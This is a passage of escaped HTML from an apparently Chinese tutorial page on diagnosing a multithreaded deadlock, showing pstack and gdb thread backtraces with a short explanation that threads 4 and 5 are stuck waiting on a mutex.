&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x429d9940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6725&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d19c7ae0d in memset () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000000000400982 in thread4(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x2af906fd9d90&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6721&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a807b35 in pthread_join () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000000000400900 in main ()&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0036 seconds] --&gt;

&lt;/div&gt;
&lt;p&gt;连续多次查看这个进程的函数调用关系堆栈进行分析：当进程吊死时，多次使用 pstack 查看进程的函数调用堆栈，死锁线程将一直处于等锁的状态，对比多次的函数调用堆栈输出结果，确定哪两个线程（或者几个线程）一直没有变化且一直处于等锁的状态（可能存在两个线程 一直没有变化）。&lt;/p&gt;
&lt;p&gt;输出分析：&lt;/p&gt;
&lt;p&gt;根据上面的输出对比可以发现，线程 1 和线程 2 由第一次 pstack 输出的处在 sleep 函数变化为第二次 pstack 输出的处在 memset 函数。但是线程 4 和线程 5 一直处在等锁状态（pthread_mutex_lock），在连续两次的 pstack 信息输出中没有变化，所以我们可以推测线程 4 和线程 5 发生了死锁。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Gdb into thread&lt;/code&gt;&lt;code&gt;输出：&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&quot;N100CE&quot;&gt;清单 6. 然后通过 gdb attach 到死锁进程&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a07799343557225&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
   (gdb) info thread 
  5 Thread 0x41e37940 (LWP 6722)  0x0000003d1a80d4c4 in __lll_lock_wait () 
  from /lib64/libpthread.so.0 
  4 Thread 0x42838940 (LWP 6723)  0x0000003d1a80d4c4 in __lll_lock_wait () 
  from /lib64/libpthread.so.0 
  3 Thread 0x43239940 (LWP 6724)  0x0000003d19c9a541 in nanosleep () 
 from /lib64/libc.so.6 
  2 Thread 0x43c3a940 (LWP 6725)  0x0000003d19c9a541 in nanosleep () 
 from /lib64/libc.so.6 
 * 1 Thread 0x2b984ecabd90 (LWP 6721)  0x0000003d1a807b35 in pthread_join () 
 from /lib64/libpthread.so.0&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07799343557225-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07799343557225-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07799343557225-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07799343557225-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07799343557225-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07799343557225-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07799343557225-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07799343557225-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07799343557225-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07799343557225-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07799343557225-11&quot;&gt;11&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07799343557225-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;info &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07799343557225-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x41e37940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6722&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0000003d1a80d4c4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;__lll_lock_wait&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07799343557225-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libpthread&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07799343557225-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x42838940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6723&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0000003d1a80d4c4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;__lll_lock_wait&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07799343557225-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libpthread&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07799343557225-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x43239940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6724&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0000003d19c9a541&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;nanosleep&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07799343557225-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07799343557225-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x43c3a940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6725&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0000003d19c9a541&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;nanosleep&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07799343557225-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07799343557225-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x2b984ecabd90&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6721&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0000003d1a807b35&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;pthread_join&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07799343557225-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;lib64&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;libpthread&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0036 seconds] --&gt;

&lt;/div&gt;
&lt;h5 id=&quot;listing6&quot;&gt;清单 7. 切换到线程 5 的输出&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a0779d467689681&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 (gdb) thread 5 
 [Switching to thread 5 (Thread 0x41e37940 (LWP 6722))]#0  0x0000003d1a80d4c4 in 
 __lll_lock_wait () from /lib64/libpthread.so.0 
 (gdb) where 
 #0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 
 #1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 
 #2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 
 #3  0x0000000000400a9b in func1 () at lock.cpp:18 
 #4  0x0000000000400ad7 in thread1 (arg=0x0) at lock.cpp:43 
 #5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0779d467689681-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0779d467689681-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a0779d467689681-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a0779d467689681-4&quot;&gt;4&lt;/div&gt;
